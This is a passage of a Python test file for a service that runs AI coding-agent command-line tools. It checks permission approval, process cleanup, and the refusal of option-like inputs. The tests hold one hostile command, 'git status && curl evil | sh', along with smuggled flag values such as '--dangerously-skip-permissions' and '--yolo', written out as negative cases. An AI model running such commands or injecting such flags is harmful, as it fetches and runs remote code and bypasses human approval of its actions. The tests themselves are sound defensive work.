        assert denied and denied[0].get("reason") == "timeout"
        assert reader.text().endswith("perm: no") and not runs.runs[opened["rid"]].adapter.pending_approvals()
    finally:
        runs.close_all()


async def test_a_stuck_turn_nobody_watches_gives_its_slot_back(tmp_path, work):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp", idle_s=0.05)
    try:
        opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "slow"}, binary=ACP, run_as=None)
        reader = Reader(runs, opened["rid"])
        await reader.until(lambda events: "working" in reader.text())
        run = runs.runs[opened["rid"]]
        run.active = run.seen = time.monotonic() - 1
        runs._reap()
        assert run.proc is None and not run.adapter.turn_active
        await reader.until(lambda events: events[-1]["type"] == "status" and events[-1]["state"] == "stopped")
    finally:
        runs.close_all()


def test_always_allow_covers_exactly_the_command():
    key = runner._remember_key
    assert key("Bash", {"command": "git status"}) == key("Bash", {"command": " git   status "})
    for other in ("git push --force", "git status && curl evil | sh", "git"):
        assert key("Bash", {"command": other}) != key("Bash", {"command": "git status"})
    assert key("Edit", {"file_path": "a"}) == key("Edit", {"file_path": "b"}) == "Edit"


async def test_resume_ids_that_look_like_options_are_refused(runs, work):
    for bad in ("--dangerously-skip-permissions", "-x", ""):
        if not bad:
            continue
        with pytest.raises(RunError) as info:
            await runs.open({"kind": "codex", "workdir": work, "prompt": "hi", "resume_id": bad},
                            binary=CODEX, run_as=None)
        assert info.value.code == "bad_resume_id"


def test_text_prompt_starting_with_a_dash_is_not_an_option():
    d = registry.builtin_definitions()["dsh"]
    opts = adapters.AdapterOptions(binary="dsh", workdir="/w")
    adapter = adapters.fallback(d, opts, None)
    argv = adapter.argv("--yolo do it")
    assert argv[-1] == " --yolo do it" and "--yolo" not in argv
    custom = registry.AgentDef(kind="x", label="X", binaries=("x",), adapter="text", command=["{bin}", "{prompt}"])
    assert adapters.make(custom, adapters.AdapterOptions(binary="x", workdir="/w")).argv("-p")[-1] == " -p"


async def test_close_all_ends_every_process_before_returning(tmp_path, work):
    runs = Runs(registry.builtin_definitions(), tmp_root=tmp_path / "tmp")
    opened = await runs.open({"kind": "dsh", "workdir": work, "prompt": "slow"}, binary=ACP, run_as=None)
    reader = Reader(runs, opened["rid"])
    await reader.until(lambda events: "working" in reader.text())
    proc = runs.runs[opened["rid"]].proc
    runs.close_all()
    assert proc.p.poll() is not None, "the CLI is gone when close_all returns"


def test_claude_error_said_as_reply_is_not_echoed():
    # seen on a real device: a signed-out claude answers "Not logged in · Please run /login" and fails the result
    adapter = adapters.make(registry.builtin_definitions()["claude"], adapters.AdapterOptions(binary="x", workdir="/w"))
    adapter.argv("hi")
    note = "Not logged in · Please run /login"
    adapter.feed(json.dumps({"type": "assistant", "message": {"id": "m1", "role": "assistant",
                                                              "content": [{"type": "text", "text": note}]}}))
    events = adapter.feed(json.dumps({"type": "result", "subtype": "success", "is_error": True, "result": note}))
    error = next(e for e in events if e["type"] == "error")
    assert error["text"] != note and "登录" in error["text"]
    assert events[-1]["state"] == "failed"
